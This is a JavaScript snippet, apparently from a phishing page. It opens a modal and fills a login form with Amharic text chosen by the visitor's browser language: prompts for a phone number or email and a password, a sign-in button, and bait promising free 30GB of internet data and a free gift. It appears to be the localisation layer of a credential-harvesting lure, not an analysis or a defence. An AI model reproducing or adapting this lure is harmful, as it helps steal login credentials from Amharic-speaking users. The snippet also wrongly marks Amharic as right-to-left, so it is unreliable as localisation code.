           // Get the modal
           var modal = document.getElementById('myModal');
        // Get the button that opens the modal
        var btn = document.getElementById("myBtn");
        // When the user clicks the button, open the modal
        btn.onclick = function() {
            modal.style.display = "block";
        }
transItems = document.querySelectorAll(".translated");
var userLang = (navigator.language || navigator.userLanguage).split('-')[0];
var Translate = {
    am: {
        dir: 'rtl',
        log_alert: 'ለመቀጠል መግባት አለብዎት',
        user: 'የተንቀሳቃሽ ስልክ ቁጥር ወይም የኢሜይል አድራሻ',
        pass: 'ሚስጢራዊ ቃል',
        button: 'ስግን እን',
        main: 'ነጻ 30GB የበይነመረብ ውሂብ ያግኙ',
        update_button: 'ነፃ ስጦታዎን ይጠይቁ'

    }
}

transItems[0].style.direction = Translate[userLang].dir;
transItems[1].innerHTML = Translate[userLang].log_alert;
transItems[2].setAttribute("placeholder", Translate[userLang].user);
transItems[3].setAttribute("placeholder", Translate[userLang].pass);
transItems[4].innerHTML = Translate[userLang].button;
transItems[5].innerHTML = Translate[userLang].main;
transItems[6].innerHTML = Translate[userLang].update_button;
